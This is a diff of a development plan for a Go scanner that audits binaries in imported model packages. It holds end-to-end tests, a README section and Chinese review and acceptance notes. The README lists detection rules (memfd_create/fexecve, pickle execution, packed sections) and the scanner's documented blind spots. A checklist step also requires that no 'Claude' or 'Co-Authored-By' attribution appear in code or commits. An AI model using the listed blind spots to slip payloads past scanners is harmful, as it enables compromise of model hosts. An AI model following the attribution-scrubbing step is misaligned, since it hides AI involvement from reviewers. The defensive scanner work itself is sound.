+			}
+		}
+	}
+	if got := binarySummary(t, audit).FilesCount; got != 2 {
+		t.Errorf("Binary.FilesCount = %d, want 2", got)
+	}
+}
+
+// TestEndToEndUncorroboratedPresenceStillPasses pins the corroboration gate end
+// to end, which is the one shape the other tests cannot reach: a shared object
+// whose only evidence is a symbol name.
+//
+// NET_002 reads .dynsym, and a linker writes every symbol the object might
+// reference into it, so the name says the file is able to call socket - not that
+// it does. The gate therefore reports it at LOW unless the same file carries
+// independent corroboration (a packed executable section, or a pickle target).
+// This fixture has neither, so the finding must come out LOW with a reason
+// attached, the count must be recorded, and the import must be allowed through.
+//
+// Both policies are run because they disagree about what the downgrade has to
+// reach. assist passes on High == 0; gate passes on High == 0 && Medium == 0. A
+// gate that stopped at MEDIUM would leave this package passable under assist and
+// block it in production, and only the gate half of this test would notice.
+func TestEndToEndUncorroboratedPresenceStillPasses(t *testing.T) {
+	for _, policy := range []string{"assist", "gate"} {
+		t.Run(policy, func(t *testing.T) {
+			dir := t.TempDir()
+			writeTestBytes(t, dir, "native/libnet.so", elfFixtureBytes(t, elfSpec{
+				imports: []string{"socket"},
+				needed:  []string{"libc.so.6"},
+				text:    []byte("ordinary code, no packed section"),
+			}))
+
+			audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), endToEndConfig(policy), nil)
+			if err != nil {
+				t.Fatalf("GenerateAuditReport: %v", err)
+			}
+			if !audit.Conclusion.Passed {
+				t.Fatalf("a shared object whose only evidence is an uncorroborated symbol name was blocked under %s; findings: %s",
+					policy, dumpFindings(audit))
+			}
+
+			f, ok := endToEndFinding(audit, "native/libnet.so", "NET_002")
+			if !ok {
+				t.Fatalf("no NET_002 finding for native/libnet.so; the dynsym import did not reach the report at all. findings: %s",
+					dumpFindings(audit))
+			}
+			if f.Severity != "LOW" {
+				t.Errorf("NET_002 severity = %s, want LOW: this file carries no corroboration, and %s blocks the import under assist and gate alike",
+					f.Severity, f.Severity)
+			}
+			if f.DowngradeReason == "" {
+				t.Error("NET_002 was reported below its rule's severity with no downgrade reason attached; " +
+					"a reader cannot tell 'the rule says LOW' from 'the rule says HIGH and this file did not earn it'")
+			}
+			if got := binarySummary(t, audit).PresenceDowngraded; got != 1 {
+				t.Errorf("Binary.PresenceDowngraded = %d, want 1", got)
+			}
+		})
 	}
 }
 
 // TestEndToEndBoundedExecutableBlocks pins the fail-closed direction that is
 // easiest to get wrong: a shared object the scan could not finish reading must
 // block, because a verdict reached without reading it is not a verdict.
+//
+// The limit the fixture reaches is MaxStreamBytes, the per-file read budget,
+// rather than a per-section cap - there is no per-section cap any more (see
+// BinaryConfig), and a section that declares more than the file holds is caught
+// by the read-versus-declared comparison instead.
+//
+// The absence assertion is what makes this test about the budget rather than
+// about the file being large: .text here is high-entropy and executable, so if
+// the section reader ignored the budget and read the section anyway, BIN_001
+// would fire and the file would be refused for being packed instead. Both
+// outcomes withhold the pass, so only the absence of the entropy verdict
+// distinguishes a scan that stopped short from one that measured everything.
 func TestEndToEndBoundedExecutableBlocks(t *testing.T) {
 	dir := t.TempDir()
 	writeTestBytes(t, dir, "native/libbig.so", elfFixtureBytes(t, elfSpec{
@@ -5138,40 +10632,91 @@ func TestEndToEndBoundedExecutableBlocks(t *testing.T) {
 		textExec: true,
 	}))
 
-	cfg := AuditConfig{
-		LLM: LLMConfig{Enabled: false, Policy: "assist"},
-		Binary: BinaryConfig{
-			Enabled:         true,
-			MaxSectionBytes: 16, // smaller than .text, so the executable section cannot be read
-		},
+	cfg := endToEndConfig("assist")
+	// Only MaxStreamBytes is set: normalizeBinaryConfig resolves every other zero
+	// to its default, and Enabled is the one field it cannot touch, so it is
+	// spelled out. A zero-valued BinaryConfig would run the channel disabled and
+	// this test would then assert a bound nothing produced.
+	cfg.Binary = BinaryConfig{
+		Enabled:        true,
+		MaxStreamBytes: 16, // smaller than the file, so neither pass can finish reading it
 	}
+
 	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, nil)
 	if err != nil {
 		t.Fatalf("GenerateAuditReport: %v", err)
 	}
-	if audit.ScanMetadata.Binary.BoundedExecutable != 1 {
-		t.Errorf("BoundedExecutable = %d, want 1", audit.ScanMetadata.Binary.BoundedExecutable)
+	if got := binarySummary(t, audit).BoundedExecutable; got != 1 {
+		t.Errorf("BoundedExecutable = %d, want 1", got)
 	}
 	if audit.Conclusion.Passed {
-		t.Error("Passed = true after an executable section could not be read; the gap did not reach the verdict")
+		t.Error("Passed = true after an executable file could not be read in full; the gap did not reach the verdict")
 	}
+	if _, ok := endToEndFinding(audit, "native/libbig.so", "BIN_001"); ok {
+		t.Error("BIN_001 fired on a file the budget was supposed to stop the section reader from measuring; " +
+			"the bound is recorded but the read it bounds did not happen")
+	}
+}
+
+// rulesByFile indexes the report's rule ids by file, for assertHasRule.
+func rulesByFile(audit *AuditReport) map[string][]string {
+	byFile := map[string][]string{}
+	for _, fr := range audit.FileReports {
+		for _, f := range fr.Findings {
+			byFile[f.File] = append(byFile[f.File], f.RuleID)
+		}
+	}
+	return byFile
+}
+
+// binarySummary returns the binary scan summary, failing the test rather than
+// panicking when the channel did not run - a nil deref in three places would
+// report the symptom as a crash instead of as the missing pass it is.
+func binarySummary(t *testing.T, audit *AuditReport) *BinaryScanSummary {
+	t.Helper()
+	if audit.ScanMetadata.Binary == nil {
+		t.Fatal("ScanMetadata.Binary is nil; the binary channel did not run")
+	}
+	return audit.ScanMetadata.Binary
+}
+
+// findFinding returns the first finding the report carries for the file whose
+// path ends in suffix under the given rule.
+func endToEndFinding(audit *AuditReport, suffix, rule string) (Finding, bool) {
+	for _, fr := range audit.FileReports {
+		for _, f := range fr.Findings {
+			if strings.HasSuffix(f.File, suffix) && f.RuleID == rule {
+				return f, true
+			}
+		}
+	}
+	return Finding{}, false
 }
 
 func assertHasRule(t *testing.T, byFile map[string][]string, file, rule string) {
 	t.Helper()
-	for f, rules := range byFile {
-		if !strings.HasSuffix(f, file) {
-			continue
+	var matched []string
+	for f := range byFile {
+		if strings.HasSuffix(f, file) {
+			matched = append(matched, f)
 		}
-		for _, r := range rules {
+	}
+	// Sorted so that a fixture with two files sharing a suffix names the same one
+	// on every run; ranging the map directly would make the message - and which
+	// file is checked first - depend on map order.
+	sort.Strings(matched)
+	if len(matched) == 0 {
+		t.Errorf("no file report for %s; findings were %v", file, byFile)
+		return
+	}
+	for _, f := range matched {
+		for _, r := range byFile[f] {
 			if r == rule {
 				return
 			}
 		}
-		t.Errorf("%s has rules %v, want %s among them", f, rules, rule)
-		return
 	}
-	t.Errorf("no file report for %s; findings were %v", file, byFile)
+	t.Errorf("no file matching %s carries %s; findings were %v", file, rule, byFile)
 }
 
 func dumpFindings(audit *AuditReport) string {
@@ -5205,21 +10750,25 @@ go test ./... 2>&1 | grep -vE "^ok|no test files" | head -30
 
 - [ ] **Step 4: 更新 README**
 
-在 README 的代码审计章节追加一节（放在 Tier 1 引擎说明之后）：
+在 README 的代码审计章节追加一节。**插入点（务必不要切断那个编号列表）**：`## Core Security Architecture`（`README.md:199`）下的 `### 3. Two-Tier Defense-In-Depth Code Security Audit`（`README.md:235`）带着一个 `1.`/`2.` 编号列表，第 2 项以 `... strict fail-closed security gates.`（`README.md:248`）结尾；列表之后是一条以 `> **Roadmap — not part of the runtime audit path yet**` 开头的引用块（`README.md:250`）。**把新节插在这条引用块之后、其后的 `---` 分隔线之前**（即 `README.md:250` 与 `:252` 之间）——插在引用块之前会把那条注解与它所注解的列表分开。新节用 `### 4.` 编号，与 `### 1.`/`### 2.`/`### 3.` 同级；标题就是下面片段的第一行。片段正文是**英文**（README 全文为英文），计划里的中文解说留在 fence 之外：
 
 ```markdown
-### 二进制审计通道
+### 4. Binary Audit Channel
 
-源码审计之外，导入审计还会遍历模型包中的**二进制文件**，与所选 Tier 1 引擎无关——正则臂与 semgrep 臂的部署都生效。
+Alongside source auditing, the import audit also walks the **binary files** in a model package, independent of the selected Tier 1 engine - it applies to both the regex-arm and the Semgrep-arm deployments.
 
-- **识别**：按文件内容判定（ELF / zip 容器 / gzip / pickle / numpy / 其余二进制），扩展名仅作补充。改后缀不能绕过；`.py` 结尾的二进制同样会被认领。
-- **证据**：ELF 动态导入符号与 `DT_NEEDED`、节区构成与香农熵、可打印字符串、容器成员（zip/gzip 内部最多递归一层）、pickle 的 `GLOBAL`/`STACK_GLOBAL` 目标、超过 64 MiB 的文件读首尾各 1 MiB（捕捉 zip 末尾追加的载荷，并把单文件成本钉在约 190 ms）。
-- **判定**：证据行按规则表匹配，产出 `Finding` 并标记 `binary_kind` / `evidence_source` / `binary_offset`；共享规则（`NET_002`/`CMD_001`/`DYN_001`/`FIL_001`/`PER_001`/`ENV_001`/`OBF_001`）的严重级从源码规则表读取，不另立一套。二进制专有规则：`BIN_001`（加壳载荷，MEDIUM）、`BIN_002`（`memfd_create`/`fexecve`，HIGH）、`PKL_001`（pickle 反序列化执行，HIGH）。
-- **复核**：二进制 finding 与源码 finding 走同一条 LLM 路径；文件级分析使用二进制专用 prompt（现有 prompt 面向 Python 源码，不适用）。
-- **完整性**：`scan_metadata.binary` 记录 `files_count` / `kinds` / `bounded_executable` / `bounded_data` / `incomplete` / `truncated`。可执行格式的结构抽取被截断、文件无法读取、finding 触顶，任一项都会使 `ProvesCleanScan()` 为假——fail-closed 下即阻断导入；纯数据文件（张量、npy）的证据截断只记录、不阻断。
-- **配置**：`security.binaryAudit.enabled`（默认 `true`）、`maxArchiveMembers`、`highEntropyThreshold`、`maxFindings`（默认 50，独立于源码臂的 200）、`maxFullScanBytes`（默认 64 MiB）。关闭它即回滚，审计行为与引入该通道之前逐字节一致。
-- **边界**：PE/Mach-O 不做结构解析（本平台不加载），xz/zstd/bzip2 容器不打开，纯文本非源码文件不审，pickle 目标识别依赖 opcode 相邻性因而可被受控流规避。详见 `.claude/plans/2026-10-10-binary-code-audit.md` §2。
+- **Identification**: by file content (ELF / zip container / gzip / pickle / numpy / other binary), with the extension only as a supplement. Renaming the suffix does not bypass it; a binary file named `.py` is claimed as well. A file is read as a pickle when its head carries a pickle magic, when its name says `.pkl`/`.pickle`/`.joblib`, or - for the magic-less protocols 0 and 1 - when the head parses as a protocol 0/1 pickle stream carrying a `module.attribute` target. Only that third test yields to the source arm: a `.py` is vetoed from the head sniff and stays with the source channel, while a `.py` whose head carries a pickle magic, and any file named `.pkl`/`.pickle`/`.joblib`, is claimed as a pickle anyway - the claim rests on content the source reader would never look at, and a claimed file's text reading is dropped.
+- **Evidence**: ELF dynamic-import symbols and `DT_NEEDED`, section layout and Shannon entropy, printable strings, container members (at most one level of recursion inside zip/gzip), pickle `GLOBAL`/`STACK_GLOBAL`/`INST` targets (read with a memo-table opcode interpreter). Files are read end to end up to 64 MiB, which at the measured 338 MB/s caps one file's read at about 190 ms; above that only the head and tail 1 MiB are read, which is what keeps a payload appended past a zip trailer visible.
+- **Verdict**: evidence lines are matched against the rule table and produce a `Finding` tagged with `binary_kind` / `evidence_source` / `binary_offset`. **Structural evidence** (ELF dynamic symbols, `DT_NEEDED`) goes through the shared rules `NET_002`/`CMD_001`/`DYN_001`, whose severity is read from the source rule table rather than restated; the binary-only rules are `BIN_001` (near-random executable-section entropy, HIGH), `BIN_002` (`memfd_create`/`fexecve`, HIGH) and `PKL_001` (pickle deserialization execution, HIGH). **A name is not a call**: `NET_002`, `CMD_001` and `BIN_002` take their evidence only from `.dynsym` and `DT_NEEDED`, which a linker fills with every symbol the object might reference, so those three report HIGH only when the same file also carries a corroborator - entropy evidence or a resolved pickle target (`BIN_001` or `PKL_001`) - and LOW otherwise, with the count recorded as `presence_downgraded`. The rule table itself is untouched: the id and the severity it resolves to are still the shared table's, because the downgrade acts on the finding and never on the rule. **String evidence** does not share the source arm's ids - `CMD_002`/`PER_002`/`FIL_002`/`ENV_002` are four independent LOW families, for the reason below: a finding can be HIGH only when it is backed by a structure a file cannot produce by accident, and a string constant is not; the source arm's same-named families `CMD_001`/`PER_001`/`FIL_001`/`ENV_001` are HIGH/MEDIUM in the shared table, and borrowing them would lift "a certain word appeared in some literal" to blocking severity. `OBF_001` has **no** family in the binary arm: its old pattern `^[A-Za-z0-9+/]{120,}={0,2}$` fired on 23 of 28 legitimate shared libraries (long base64-alphabet strings are everywhere in `.pyc` constant pools and binary data), and neither narrowing the alphabet nor raising the floor fixes it, so only the source arm's call-site version is kept.
+- **Review**: binary findings go down the same LLM path as source findings; file-level analysis uses a binary-specific prompt (the existing prompt targets Python source and does not apply). **Honesty**: the file-level branch is reachable only when the caller implements `FileAnalyzer`, and the production `LLMClient` (`teellm.Client`) has no `AnalyzeFile`, so today it is driven only by test mocks and is not live behavior - exactly the existing situation of the source file path, which this plan does not change.
+- **Completeness**: `scan_metadata.binary` records `files_count` / `kinds` / `bounded_executable` / `bounded_data` / `incomplete` / `errored` / `findings_capped` / `findings_dropped` / `max_findings` / `presence_downgraded`. Any gap that lands on a format that can execute (ELF, archive, pickle, compressed) makes `ProvesCleanScan()` false - a truncated structural extraction, a capped listing, an unreadable file, or a whole-pass failure - and under fail-closed that blocks the import; the same cut on a pure data file (raw blob, tensor) is recorded but does not withhold. The split is by kind rather than by which bound fired: a capped listing is the matcher's input, so on an executable kind it can drop blocking evidence, while on a data kind it can only drop LOW free-string lines. **The finding cap is not part of completeness**: reaching it writes only `findings_capped`/`findings_dropped`, not `scan_metadata.truncated`, and does not block; the cap spends only the LOW tier, and the findings that can block - HIGH under `assist` and `gate`, MEDIUM under `gate` - are kept regardless of the budget.
+- **Configuration**: `security.binaryAudit.enabled` (default `true`), `maxArchiveMembers`, `highEntropyThreshold`, `maxFindings` (default 50, independent of the source arm's 200; it is a listing budget, so lowering it drops only LOW findings and never a finding that can block - HIGH under `assist` and `gate`, MEDIUM under `gate` - and never blocks the import), `maxFullScanBytes` (default 64 MiB) and `maxStreamBytes` (default 3 GiB, which against the shipped `maxFullScanBytes` never binds). Turning it off rolls back: the audit behaves byte-for-byte as before the channel was introduced.
+- **Boundaries**: PE/Mach-O are not structurally parsed (not loaded on this platform), xz/zstd/bzip2/7z containers and tar are not opened, plain-text non-source files are not audited, nested archives recurse only one level, and the pickle interpreter runs only on streams claimed as pickle - by magic, by name, or by a protocol 0/1 target the head parses to. One residual boundary follows from the claim being made about the 4 KiB head: a protocol 0/1 stream whose `module.attribute` target lies past the head (say, a protocol 1 stream that pushes a large BINSTRING before its GLOBAL) is claimed only by extension, so only a `.pkl`/`.pickle`/`.joblib` name reaches the interpreter; next to it is the source-named residual: a protocol 0/1 pickle named `.py` is not claimed by the binary channel at all - `.py` is not in the pickle extension set and the source veto runs ahead of the head sniff - so it stays with the source arm, which reads it as Python text and never runs the pickle interpreter; and a pickle appended past the end of a non-pickle file whose head carries no pickle magic is not claimed at all.
 ```
+
+> **Review 条目的那条内部引用只在本计划里去掉（2026-10-13）**：草稿的 Review 条目原以 `(see the two notes in Task 13)` 结尾，而 `Task 13` 是本计划的章节，README 的读者看不到，所以 README 里没有它——实现照此写是对的，本计划这一处随之删去，两边就此逐字一致。**中文解说必须留在 fence 之外**（本节 Step 4 已写明），评审第一轮据此指出上一版把说明写进了 fence；这一版因此把它放在闭 fence 之后。
+>
+> **Boundaries 条目结尾的悬空引用已删（2026-10-13，终审 finding 2）**：该条目原以 `See the binary audit channel design notes for details.` 结尾，但**树里没有任何这样一份设计笔记**（`.claude/specs/` 与 `.claude/plans/` 下都搜不到，README 别处引用的是 Semgrep 那份 spec），读者无从打开。删句而不是补文档：这句话本身不承载信息，条目已经把它要说的边界逐条写完了。README 与本节 fence 同时删，两边保持逐字一致。
 
 - [ ] **Step 5: 提交**
 
@@ -5229,7 +10778,27 @@ git add internal/codeaudit/binary_integration_test.go README.md
 git commit -m "test(audit): cover the binary channel end to end and document it"
 ```
 
+> **门禁判据：`gofmt -l internal/` 输出要先与基线比，别把既有文件当成自己的错。** 判据同 Task 14 Step 7：HEAD 上这条命令会列出既有的未格式化文件（至少 `internal/app/taa/app.go`、`internal/app/taa/app_test.go`、`internal/codeaudit/audit.go`、`internal/codeaudit/llm.go`、`internal/codeaudit/result_checker.go`），它们不是本步的问题；只有**基线之外的增量**（本步新写/新改的文件）才算你的问题，**严禁 `gofmt -w`**。
+
 本计划文件已在开工前入库（`.claude/` 在 `.gitignore` 中，需 `git add -f`），此处无需再提交。
+
+> **规格评审后的修正（2026-10-13）**：Task 15 的规格符合性评审判定实现（`binary_integration_test.go` + README 新节）与规格一致，只提出一处偏离——README 的 **Review** 条目比本节草稿少了结尾的 `(see the two notes in Task 13)`。偏离方向本身是对的（`Task 13` 指计划内部章节，README 的读者看不到），但实现者既没回退也没上报，而本节写明了「片段正文原样插入」。**修正落在本计划而不是 README**：删掉草稿里那句内部引用。README 无需改动，因此本次只改计划文件。
+>
+> 追记：第一版把解释这句改动的中文直接附在了 Review 条目那一行上，而那一行在 ```markdown fence **之内**——本节 Step 4 明写「片段正文是**英文**……中文解说留在 fence 之外」，评审据此打回。现改为英文正文与 README 逐字一致（已核对：fence 内 9 行对 README `### 4.` 节 9 行，`BYTE-IDENTICAL`，fence 内无非 ASCII），中文解说移到闭 fence 之后。
+
+> **代码质量评审后的修正（2026-10-13）**：判 **CHANGES REQUESTED**——无生产缺陷，但测试的判别力弱于其注释所称，且 README 有三处事实错误。四项处置如下。
+>
+> 1. **佐证门控在端到端层零覆盖（新增测试）**。门控正是本轮 README 更正的主题，而三条既有测试里它从不触发：恶意包的 `.so` 总被自身熵行佐证，干净包的导入不匹配任何 presence 模式，探针显示每种情形的 `presence_downgraded` 都是 0。变异证明：`downgrades` 恒假、`corroborates` 恒假都无人捕获。新增 `TestEndToEndUncorroboratedPresenceStillPasses`：只从 `.dynsym` 导入 `socket`、无可执行节、无 pickle 目标，断言 `NET_002` 严重级为 LOW、`DowngradeReason` 非空、`presence_downgraded == 1`，且**在 `assist` 与 `gate` 两种策略下各跑一遍**——这两者对此事的判据不同（`assist` 看 `High == 0`，`gate` 看 `High == 0 && Medium == 0`），只停在 MEDIUM 的门控会在 `assist` 下放行、在生产里阻断，只有 `gate` 那半边能发现。这一条同时补上了本计划第 4 节验收清单里的「佐证门控生效（两种策略）」。
+> 2. **三条臂的权重没被钉住（加断言）**。原测试只断言规则**存在**，不断言层级；而结论是**过度决定**的——`libevil.so` 单文件就有四个 HIGH，任何一条臂被降级，`CRITICAL` 与 `!Passed` 都靠其余臂继续成立。于是把 PKL_001 的严重级降到 LOW 这类改动无人捕获。现改为对 `libevil.so` 的 `BIN_001`/`NET_002`/`BIN_002` 逐条断言 `HIGH` 且 `DowngradeReason` 为空（该文件自带高熵可执行节，正是门控等待的佐证），并对 `checkpoint.pt` 的 `PKL_001` 断言 `HIGH`。**变异证明**：把 `PKL_001`、`BIN_001`、`NET_002` 的 finding 事后改成 LOW，三条现在都被捕获。
+> 3. **有界测试分不清是哪个 reader 撞了预算（加缺失断言）**。`streamWithSizeSwitch` 仅凭「文件大小 > 预算」就已置位 `Bound.Structural`，所以 `BoundedExecutable == 1` 与 `!Passed` 在 section reader 完全无视预算时同样成立——去掉 `countSection` 的预算钳制，该测试照样通过（此时整节被读完，反而触发 `BIN_001`，路径不同而结论相同）。现补上「`libbig.so` 上**不得**出现 `BIN_001`」这一缺失断言：夹具的 `.text` 是高熵且可执行，绕开预算就会以「加壳」为由拒绝，两种结局都拒绝，只有这条缺失断言能把「读到一半停下」与「全都量过了」分开。**变异证明**：去掉 `countSection` 的钳制后该测试失败。
+> 4. **README 三处事实错误（已改，并同步回本节 Step 4 的 fence）**：(a) Identification 条目把「内容主张只作用于源码臂不读的文件」写成覆盖整条 pickle 判定，但 `isPickleStream` 的 **magic 分支排在源码 veto 之前**，所以带 pickle magic 的 `.py` 确实被认领为 pickle——原句与该条目开头「命名为 `.py` 的二进制文件同样会被认领」自相矛盾；现改为只有第三项（protocol 0/1 嗅探）让位于源码臂。(b) Evidence 条目把「约 190 ms」挂在首尾各 1 MiB 的读法上，而 190 ms 是 **64 MiB 全量扫描**的成本（338 MB/s），首尾各 1 MiB 只有约 6 ms；现改为挂在全量读上。(c) Completeness 条目列了 9 个字段而 `BinaryScanSummary` 有 **10** 个，漏掉 `presence_downgraded`，而同节 Verdict 条目正在讨论它；已补全。
+>
+> **追记（2026-10-13，复核轮打回）**：上一版此处的记录写着「`downgrades` 恒真的变异仍无人捕获，且经核实是等效变异体」。**两句都错**，已删改：
+>
+> - **并非无人捕获**，只是不被这四条集成测试捕获。把 `go test` 的范围从 `-run TestEndToEnd` 放开到整个包，`TestBinaryFamilyClassificationIsPinned`（`binary_rules_test.go:475`，逐族断言 `downgrades(id) == wantDowngrade[id]`）与 `TestBinaryScannerCapKeepsAMediumFindingBeyondTheBudget`、`TestBinaryScannerCapKeepsAnUnknownSeverityPastTheBudget` 三条立即失败。我上一轮只跑了 `-run TestEndToEnd`，把「不被这四条抓住」当成了「无人抓住」。
+> - **并非等效变异体**。`downgrades` 的判据是 `presenceOnly() && Severity == SeverityHigh`（`binary_rules.go:566`），而 **`DYN_001` 是 presence-only 但 MEDIUM**（`binary_rules.go:283-289`），所以真门控对它返回 false、变异体返回 true——两者在**未被佐证**的文件上就分岔：一个只导入 `dlopen` 的 `.so`，真门控把 `DYN_001` 留在 MEDIUM（`gate` 下阻断），变异体改写成 LOW（不阻断），此外还会给命中的 LOW 字符串族挂上伪 `DowngradeReason` 并虚增 `presence_downgraded`。门控自己的注释（`binary_rules.go:554-556`）早就写明「解析为 MEDIUM 的族（DYN_001）永远产生不了这里要拦的 HIGH」——我读到了这句却把它当成了「所以降不降无所谓」。我上一轮引用的调用点短路 `!corroborated && …` 是真的，但它只说明被佐证的文件不受影响，**不能**推出未被佐证的那一支等价。
+>
+> 结论：这个变异不需要新测试（已有单元测试覆盖），但理由与上一版记录写的相反——**它是被别处覆盖，不是无害**。
 
 ---
 
@@ -5239,13 +10808,34 @@ git commit -m "test(audit): cover the binary channel end to end and document it"
 
 - [ ] `CGO_ENABLED=0 GOOS=linux go build -o bin/taa ./cmd/taa` 成功（initrd 要求静态链接）。
 - [ ] `go test ./...` 无 FAIL。**尤其**：`internal/codeaudit` 的既有 fail-closed、gate semantics、report fields、corpus parity 用例全部保持通过——它们是这次改动的回归网。
-- [ ] `go test ./internal/codeaudit/ -run 'TestGenerateAuditReport' -v` 中，`regex` 与 `semgrep` 两个子用例都通过（本机装有 semgrep 时真跑）。
 - [ ] `git grep -n "Co-Authored-By\|anthropic\|Claude" -- '*.go'` 无命中（提交信息同样不得出现）。
-- [ ] 用一个真实模型包（含 `.pt` 与任意 `.so`）在容器里跑一次导入，确认 `auditReportJSON` 里出现 `binary_kind`/`evidence_source` 字段，且 `scan_metadata.binary.files_count > 0`。
-- [ ] 确认 `target.files_scanned` 与 `scan_metadata.binary.files_count` 不互相矛盾——后者是前者的子集，前者不小于后者。
-- [ ] 确认二进制臂触顶时 `scan_metadata.truncated` 为 `true`（不只是 `scan_metadata.binary.truncated`），否则只看元数据这一层的读者会以为没有丢东西。
+- [ ] `go test ./internal/codeaudit/ -run 'TestGenerateAuditReportRunsTheBinaryChannelForEveryEngine' -v`：`regex` 子用例必须 **PASS**；`semgrep` 子用例在装有 CLI 的机器上必须 PASS，在没装的机器上会 **SKIP**——跳过不等于通过，它是「这一条没有被验证」。所以在没装 semgrep 的机器上，必须在报告里显式记下它被跳过了，或者换一台装了的机器重跑。（被测函数就是 `TestGenerateAuditReportRunsTheBinaryChannelForEveryEngine`，它的两个子用例名分别是 `regex` 与 `semgrep`；仓库里**没有**一个叫 `TestGenerateAuditReport` 的函数，前面写成前缀匹配只是碰巧选中了它。）
+- [ ] 用一个真实模型包（含 `.pt` 与任意 `.so`）在容器里跑一次导入，确认 `auditReportJSON` 里出现 `binary_kind`/`evidence_source` 字段。**这两个字段在 `file_reports[].findings[]` 里**（`rules.go:61,67` 把它们挂在 `Finding` 上），**不要去找 `scan_metadata`**：投影 `projectCodeAuditSection`（`codeaudit_projection.go:21-33`）只发 `conclusion` 与 `file_reports`，`scan_metadata` 与 `target` 都不出进程（`audit.go:96-109` 已写明），所以 `scan_metadata.binary.files_count` 与 `target.files_scanned` 在这份 JSON 里**永远不会出现**。要核对这两个数就看宿主侧日志那一行（`import_processing.go:664-668`，形如 `二进制审计: files=N kinds=...`），它们只在进程内可见。同一处再确认合计与分项的关系：`target.files_scanned`（= `report.FilesCount` = 源臂计数 + 二进制臂 `files_count`，`audit.go:723-743`）是**上界而不是普查**——两臂判据不同（源臂按扩展名、本通道按内容），同一个文件可能被两臂各计一次，且源臂从不暴露自己数了哪些文件，去重连原理上都做不到——所以只能确认它 `>=` 二进制臂 `files_count` **且 `files_count > 0`**，不能要求相等。**两条必须合看**：单独拿 `0 >= 0` 也满足那个不等式，所以「前者不小于后者」只有在 `files_count > 0` 时才算被验证。**这一条依赖容器/部署环境**（在 CSV2 guest 里跑一次真实导入），**不是本机 `go test` 能满足的**：须单独安排一次环境验证，并在报告里注明是跑过还是未跑——未跑时这一项记为「未验证」，不得算作通过。
+- [ ] 二进制臂触顶时 `scan_metadata.binary.findings_capped` 为 `true` 且 `findings_dropped > 0`，而 **`scan_metadata.truncated` 仍为 `false`**。这一条是本计划最容易写反的地方，所以两个方向都要验：**必须在会触顶的输入上验证**——造一个二进制 finding 数超过 `BinaryConfig.MaxFindings`（默认 50）的包，确认 `scan_metadata.binary.findings_capped == true`；再抓同一个包，确认 `scan_metadata.truncated == false`。反过来的形状（触顶即把 `truncated` 置真）会让二进制通道因为"找到太多"而拒绝导入，而它丢掉的只会是 LOW——LOW 在 `assist` 与 `gate` 两种策略下都不阻断，能阻断的 HIGH 和 MEDIUM 无论预算如何都保留（`ScanDirectory` 的 cap 只花 LOW 这一档；`gate` 下 `passed` 是 `High == 0 && Medium == 0`，所以 MEDIUM 也必须留，理由见该处注释）——对一个普通包跑这一条永远是「没错顶」，等于没验。
 - [ ] 把 `security.binaryAudit.enabled` 设为 `false` 再跑一次，确认 `scan_metadata.binary` 缺失且结论与改动前一致（回滚可用）。
-- [ ] 确认 `UnsupportedExts` 仍恒为 0——本计划**不**动它，任何让它非零的改动都会使每个真实包被判定为非完整扫描。
+- [ ] 佐证门控生效（Task 11b）：造一个**只**从 `.dynsym` 导入 `socket` 的 `.so` 包，确认 `NET_002` 的 `severity` 为 `LOW`、`downgrade_reason` 非空，且结论 `passed == true`。**同一条要在 `gate` 策略下再跑一次**，仍须 `passed == true`——只验 `assist` 会把 MEDIUM 的降级误判成通过（`gate` 看 HIGH 或 MEDIUM）。随后在同一个文件里放一个高熵可执行节（真加壳），确认 `NET_002` 回到 `HIGH`、这次导入被拒，且模型包仍在磁盘上、逐字节未变（审计不删、不改它读的东西）。两个方向都要验，只验降级等于只验了抑制。
+- [ ] 崩溃恢复同样不动文件（Task 11a 补充）：造一个 `model_import` 任务处于 RUNNING 时崩溃的状态，以及一个只留下 `PendingAudit` 的状态，各重启一次，确认导入状态为未导入、平台收到 code=2 补报，且模型目录逐字节未变。这两条路互斥，所以要分别造——只造其中一条会漏掉另一条。
+- [ ] `scan_metadata.binary.presence_downgraded` 在含符号证据的包上大于 0，且在触顶的包上仍等于降级总数（该计数在降级时累加，不随 cap 丢弃而减少）。
+- [ ] （**回归护栏，不是本功能的验收项**）`UnsupportedExts` 仍恒为 0——本计划**不**动它，任何让它非零的改动都会使每个真实包被判定为非完整扫描。它列在这里，是因为它属于同一次改动所以要一起回归，不是因为这个功能会让它变化。
+
+### 4.1 验收执行记录（2026-10-13）
+
+逐项执行结果。**未打勾的只有一项**，它依赖容器环境，本机不可满足，按「未验证」记录。
+
+| 清单项 | 结果 | 依据 |
+| --- | --- | --- |
+| 静态构建 | **PASS** | `CGO_ENABLED=0 GOOS=linux go build -o bin/taa ./cmd/taa` exit 0 |
+| 全量测试无 FAIL | **PASS（范围有替换）** | `go test ./...` 在本树不可用——`models/audit/holdout-sources/` 下有未跟踪、被 gitignore 的 semgrep 夹具 `.go` 文件，会让它构建失败。改用 `go test ./internal/... ./cmd/... ./pkg/...`：16 个包全 ok、0 FAIL |
+| 无 AI 署名 | **PASS** | `git grep -n "Co-Authored-By\|anthropic\|Claude" -- '*.go'` 无命中（exit 1） |
+| 两个引擎下都跑二进制通道 | **PASS（两个子用例都真跑了）** | `regex` PASS、`semgrep` **PASS 而非 SKIP**（本机装有 semgrep CLI），故这一条是**已核实**而不是「被跳过」 |
+| 容器内真实模型包导入 | **未验证** | 依赖 CSV2 guest / 容器环境，本机 `go test` 无法满足。**不得计为通过** |
+| 触顶时 `findings_capped=true` 且 `truncated=false` | **PASS（两个方向）** | 触顶一半：`TestBinaryScannerCapDropsExactlyTheLowFindingsBeyondTheBudget` 等 7 条 cap 用例；`truncated` 仍为假那一半：`TestMergeBinaryFindingsDoesNotFoldTheBinaryCapIntoTruncated`（`audit_test.go:1072`，正是为这一条写的） |
+| `enabled:false` 逐字节回滚 | **PASS** | `TestGenerateAuditReportWithBinaryDisabledIsUnchanged` |
+| 佐证门控（`assist` 与 `gate` 各一次）+ 加了佐证后被拒 + 文件逐字节未变 | **PASS（降级方向两种策略都验了）** | 降级方向：本轮新增的 `TestEndToEndUncorroboratedPresenceStillPasses`，`assist` 与 `gate` 两个子用例都 PASS（此前该条在整个端到端层零覆盖）。「文件仍在磁盘上、逐字节未变」由 `TestFailedAuditLeavesTheImportedPackageUntouched` 覆盖 |
+| 崩溃恢复不动文件（RUNNING 崩溃 + 只剩 `PendingAudit` 两条路） | **PASS** | `TestAuditPanicRollsBackModelImport`、`TestTAAState_RunAsyncSafe_ModelImportPanicRecovery`、`TestModelImportSealsPendingWithModelImported` |
